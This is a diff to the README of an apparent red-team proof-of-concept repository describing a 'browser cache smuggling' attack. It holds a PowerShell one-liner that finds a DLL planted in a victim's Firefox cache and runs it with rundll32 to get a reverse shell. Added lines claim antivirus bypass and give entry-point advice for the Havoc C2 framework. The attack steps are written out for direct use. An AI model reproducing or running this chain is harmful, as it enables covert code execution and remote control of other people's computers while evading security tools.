@@ -1,6 +1,7 @@
 # Browser cache smuggling Attack
 
 - This repository is all about the POC that can be leveraged down for initial access in red teaming engagements.
+- This has the capabilities to bypass AV , depends on from where DLL is generated !!
 - This Repo is in development , we will be adding more module for Brave & Chrome Browser soon....
 
 # Theory Behind it :
@@ -31,5 +32,5 @@ Once Our data is begin cache , we can now run the following command on victim PC
 ```powershell
 foreach ($files in @("$env:LOCALAPPDATA\Mozilla\Firefox\Profiles\*.default-release\cache2\entries\")) {Get-ChildItem $files -Recurse | ForEach-Object {if (Select-String -Pattern "ENTRYPOINT" -Path $_.FullName) {$dllPath = $_.FullName + '.'; rundll32.exe $dllPath,MainDll}}}
 ```
-
+**NOTE:** From the above command , make sure when u are running the dll file from rundll32 , you provide proper entry point eg (MainDLL) , which may be different for havoc C2.
 and we will get our reverse shell !! 
